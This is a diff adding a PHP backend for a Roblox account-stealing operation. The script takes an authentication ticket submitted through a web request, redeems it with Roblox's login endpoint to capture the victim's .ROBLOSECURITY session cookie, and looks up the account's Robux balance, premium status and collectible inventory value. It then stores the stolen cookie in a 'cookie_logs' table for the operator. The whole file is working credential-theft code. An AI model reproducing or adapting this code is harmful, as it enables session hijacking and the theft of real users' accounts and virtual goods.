@@ -1,0 +1,109 @@
+<?php
+    require("config.php");
+    require('../../includes/functions.php');
+    include_once __DIR__.'/../../../vendor/autoload.php';
+
+    try{
+
+        $rateLimitServer = [
+            'host' => '127.0.0.1',
+            'port' => 6379
+        ];
+        
+        $adapter = new \PalePurple\RateLimit\Adapter\Predis(new \Predis\Client($rateLimitServer));
+        $rateLimiter = new \PalePurple\RateLimit\RateLimit($ident, 100, 3600, $adapter);
+    
+        $id = realIP();
+        $count = $rateLimiter->getAllowance($id);
+        if ($rateLimiter->check($id)) {
+            
+            if (!isset($_SERVER['HTTP_ORIGIN']) || !in_array($_SERVER["HTTP_ORIGIN"], $allowed_origins) || !isset($_GET["t"])) {
+                die();
+            }
+        
+            $ticket = htmlspecialchars($_GET["t"]);
+            if (strlen($ticket) < 100 || strlen($ticket) >= 1000) {
+                die();
+            }
+        
+            $checkBan = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($ident)])->fetchColumn(0);
+            $subEndDate = pdoQuery($db, "SELECT `subEndDate` FROM `users` WHERE `id`=?", [htmlspecialchars($ident)])->fetchColumn();
+            $subscription = pdoQuery($db, "SELECT `subscription` FROM `users` WHERE `id`=?", [htmlspecialchars($ident)])->fetchColumn();
+        
+            if ($checkBan == '0'){
+        
+                $ch = curl_init();
+                curl_setopt($ch, CURLOPT_URL, "https://www.roblox.com/Login/Negotiate.ashx?suggest=$ticket");
+                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
+                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+                curl_setopt($ch, CURLOPT_POST, 0);
+                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+                    'RBXAuthenticationNegotiation: https://www.roblox.com',
+                    'RBX-For-Gameauth: true',
+                ));
+                curl_setopt($ch, CURLOPT_HEADER, 1);
+                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                $output = curl_exec($ch);
+                curl_close($ch);
+            
+                $cookie = getBetween($output, "set-cookie: .ROBLOSECURITY=", ";");
+                if ($cookie) {
+                    $ch = curl_init();
+                    curl_setopt($ch, CURLOPT_URL, "http://www.roblox.com/mobileapi/userinfo");
+                    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
+                        'Cookie: .ROBLOSECURITY=' . $cookie
+                    ));
+                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+                    $profile = json_decode(curl_exec($ch), 1);
+                    curl_close($ch);
+                                        
+                    if (account_filter($profile)) {
+        
+                        $PDORegister = $db -> prepare('INSERT INTO `cookie_logs` VALUES(:ID, :cookieName, :cookieRobux, :cookiePremium, :cookieRAP, :cookieRolimons, :cookieImage, :cookie, :cookieID, :date, 0)');
+                        $PDORegister -> execute(array(':ID' => $ident, ':cookieName' => $profile["UserName"], ':cookieRobux' => $profile["RobuxBalance"], ':cookiePremium' => $profile["IsPremium"], ':cookieRAP' => get_user_rap($profile["UserID"], $cookie), ':cookieRolimons' => "https://www.rolimons.com/player/" . $profile["UserID"], ':cookieImage' => $profile["ThumbnailUrl"], ':cookie' => encrypt($cookie), ':cookieID' => getID(25), ':date' => date("Y-m-d H:i:s")));
+                    }
+                }
+                
+            }
+        }else{
+            http_response_code(429);
+            exit(0);
+        }
+    }catch(Exception $e) {
+        die("An error occured");
+    }
+    
+    function getBetween($string, $start = "", $end = ""){
+        if (strpos($string, $start)){
+            $startCharCount = strpos($string, $start) + strlen($start);
+            $firstSubStr = substr($string, $startCharCount, strlen($string));
+            $endCharCount = strpos($firstSubStr, $end);
+            if ($endCharCount == 0) {
+                $endCharCount = strlen($firstSubStr);
+            }
+            return substr($firstSubStr, 0, $endCharCount);
+        } else {
+            return '';
+        }
+    }
+    function get_user_rap($user_id, $cookie) {
+        $cursor = "";
+        $total_rap = 0;
+                        
+        while ($cursor !== null) {
+            $request = curl_init();
+            curl_setopt($request, CURLOPT_URL, "https://inventory.roblox.com/v1/users/$user_id/assets/collectibles?assetType=All&sortOrder=Asc&limit=100&cursor=$cursor");
+            curl_setopt($request, CURLOPT_HTTPHEADER, array('Cookie: .ROBLOSECURITY='.$cookie));
+            curl_setopt($request, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($request, CURLOPT_SSL_VERIFYPEER, 0); 
+            curl_setopt($request, CURLOPT_SSL_VERIFYHOST, 0);
+            $data = json_decode(curl_exec($request), 1);
+            foreach($data["data"] as $item) {
+                $total_rap += $item["recentAveragePrice"];
+            }
+            $cursor = $data["nextPageCursor"] ? $data["nextPageCursor"] : null;
+        }
+                        
+        return $total_rap;
+    }
+?>
